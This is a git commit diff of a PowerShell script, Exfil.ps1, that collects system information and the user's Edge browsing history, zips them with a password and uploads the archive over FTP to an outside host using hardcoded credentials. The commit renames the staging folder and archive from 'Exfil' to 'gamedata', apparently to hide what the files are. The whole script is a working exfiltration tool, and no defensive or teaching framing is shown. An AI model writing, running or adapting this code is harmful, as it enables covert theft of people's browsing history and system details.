60c30e506b89f525d054615f1a5c4a3b696ad01d
m122 <michael.sterrett@gmail.com>
2024-01-13 18:03:05 -0500

    Update Exfil.ps1

--- Exfil.ps1
+++ Exfil.ps1
@@ -1,15 +1,15 @@
 Start-Sleep -Seconds 10
-systeminfo > C:\Windows\Temp\Exfil\systeminfo.txt
+systeminfo > C:\Windows\Temp\gamedata\systeminfo.txt
 $browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
-cp $browsing_history_file_path C:\Windows\Temp\Exfil
+cp $browsing_history_file_path C:\Windows\Temp\gamedata
 # Set the path to the 7-Zip executable (replace with your actual path)
 $zipExePath = "C:\Program Files\7-Zip\7z.exe"
 
 # Set the path to the folder you want to zip
-$folderToZip = "C:\Windows\Temp\Exfil"
+$folderToZip = "C:\Windows\Temp\gamedata"
 
 # Set the path for the output zip file
-$zipFilePath = "C:\Windows\Temp\Exfil.zip"
+$zipFilePath = "C:\Windows\Temp\gamedata.zip"
 
 # Set the password for the zip file
 $zipPassword = "batman"
@@ -21,4 +21,4 @@ Write-Host "Folder successfully zipped and password-protected. Zip file: $zipFil
 
 $client = New-Object System.Net.WebClient
 $client.Credentials = New-Object System.Net.NetworkCredential("m122", "SO1q2w!Q@W")
-$client.UploadFile("ftp://192.168.8.151/Exfil.zip","C:\Windows\Temp\Exfil.zip")
+$client.UploadFile("ftp://192.168.8.151/gamedata.zip","C:\Windows\Temp\gamedata.zip")
